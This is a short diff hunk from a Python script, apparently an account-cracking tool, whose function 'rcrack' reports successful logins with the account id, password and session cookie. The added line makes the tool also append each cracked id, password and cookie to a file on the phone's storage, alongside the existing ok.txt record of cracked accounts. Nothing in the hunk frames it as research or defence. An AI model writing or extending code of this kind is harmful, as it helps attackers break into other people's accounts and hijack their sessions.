@@ -465,6 +465,7 @@ def rcrack(uid,pwx,tl):
 
 				print(f" Cookie : {coki}")
 
+				open('/sdcard/lakhan-cookie.txt','a'). write(uid+'|'+ps+'|' +coki+'\n')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
 				oks.append(uid)
